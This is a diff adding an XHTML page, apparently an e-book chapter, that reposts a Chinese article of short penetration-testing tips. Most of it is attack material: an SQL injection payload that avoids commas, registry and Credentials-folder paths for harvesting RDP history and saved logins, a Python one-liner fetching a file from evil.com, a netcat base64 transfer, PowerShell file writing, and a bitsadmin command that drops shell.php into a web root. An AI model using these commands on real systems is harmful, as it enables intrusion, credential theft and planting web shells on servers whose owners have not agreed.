@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>1233211234567</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>1233211234567</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzA4MDMwMjQ3Mg==&amp;mid=2651865668&amp;idx=1&amp;sn=95cceeb84457f423d906b89f8ec088c7&amp;chksm=8442baa3b33533b53070601a27c2fc82722e0ce74a612e7745a305b10b7ee9aa1cce1ada60a7&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzA4MDMwMjQ3Mg==&amp;mid=2651865668&amp;idx=1&amp;sn=95cceeb84457f423d906b89f8ec088c7&amp;chksm=8442baa3b33533b53070601a27c2fc82722e0ce74a612e7745a305b10b7ee9aa1cce1ada60a7&amp;scene=27#wechat_redirect</a></blockquote><p>分享几个tips，不记得哪里找的了。</p><p><br/></p><p>注入过滤逗号</p><p>127' UNION SELECT * FROM ((SELECT1)a JOIN (SELECT2)b JOIN (SELECT3)c JOIN (SELECT4)d JOIN (SELECT5)e)# </p><p>相当于 union select 1,2,3,4,5</p><p><br/></p><p>注册表查看rdp记录</p><p>[HKEY_USERS\S-1-5-21-1387774393-1596258019-1651181295-500\Software\Microsoft\Terminal Server Client\Default]</p><p>C:\Documents and Settings\Administrator\AppData\Local\Microsoft\Credentials\</p><p><br/></p><p>只反弹个shell，传文件</p><p>curl ，ftp，wget，nc</p><p>python -c 'import urllib;urllib.urlretrieve("http://evil.com/evil.file","/path/to/save/evil.file")'</p><p>nc 'BASE64' | base64 -d &gt; xxx</p><p><br/></p><p>powershell读写文件</p><p>读文本文件：</p><p>$file = Get-Content "1.txt"<br/></p><p>写文本文件：<br/></p><p>Set-content "1.txt" "wocao"<br/></p><p>读二进制文件：<br/></p><p>[System.IO.File]::ReadAllBytes('1.exe')<br/></p><p>写二进制文件：<br/></p><p>[System.IO.File]::WriteAllBytes("1.exe",$fileContentBytes)<br/></p><p><br/></p><p>下载文件</p><p> windows:  bitsadmin /transfer n http://192.168.1.1/shell.php c:\inetpub\wwwroot\shell.php</p>
+        
+</body>
+</html>
